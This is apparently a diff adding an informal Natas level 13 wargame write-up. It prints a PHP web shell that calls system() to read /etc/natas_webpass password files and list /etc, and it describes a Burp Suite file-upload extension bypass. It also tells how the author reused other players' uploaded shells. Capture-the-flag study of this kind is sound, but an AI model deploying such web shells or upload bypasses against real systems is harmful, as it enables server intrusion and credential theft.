@@ -117,3 +117,32 @@ echo $outText;
 ?>
 
 ------------------------------------------------------------------------------------------------------------------------------------------
+
+natas13
+
+first make a php program and if you know php that is easy for you
+<?php
+echo"salaaaaaaaaaaaaaaaam";
+
+echo system("cat/tmp/natas/*");
+
+echo system("cat/etc/natas_webpass/*");
+
+
+echo system("ls -ltrh /etc");
+
+
+?>
+uploud this and usr burpsuit and change jpg to php
+then u can run your php codes
+but i just cheked latest uplouds
+and searched one of them
+becouse i know nothing about php
+<?php   echo exec('ls -1 uploads');                     ?>
+then replaced anouther php uplouded file to url
+
+i really cheated
+
+but anouther way put your commands somehow in shape of php so we are done
+u can also use ai to genereta a php codes 
+------------------------------------------------------------------------------------------------------------------------------------------
